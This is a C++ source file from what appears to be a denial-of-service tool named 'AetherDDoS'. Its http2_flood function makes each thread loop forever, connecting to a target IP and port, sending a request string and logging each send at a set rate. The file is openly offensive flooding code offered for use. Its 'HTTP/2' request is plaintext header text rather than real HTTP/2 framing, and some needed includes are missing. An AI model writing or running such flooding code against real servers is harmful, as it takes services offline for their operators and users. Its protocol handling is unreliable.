#include "aether_ddos.h"
#include <sys/socket.h>
#include <netinet/in.h>
#include <chrono>

void AetherDDoS::http2_flood(int thread_id) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { log("[-] HTTP/2 Socket failed: Thread " + std::to_string(thread_id)); return; }

    sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip.c_str(), &target_addr.sin_addr);

    while (true) {
        if (connect(sock, (sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            close(sock); sock = socket(AF_INET, SOCK_STREAM, 0); continue;
        }
        std::string frame = ":method: GET\n:path: /\n:scheme: https\n:authority: " + target_ip + "\n\n";
        send(sock, frame.c_str(), frame.size(), 0);
        log("[*] HTTP/2 Thread " + std::to_string(thread_id) + ": Frame sent!");
        std::this_thread::sleep_for(std::chrono::microseconds(1000000 / rate_per_thread));
        close(sock); sock = socket(AF_INET, SOCK_STREAM, 0);
    }
}
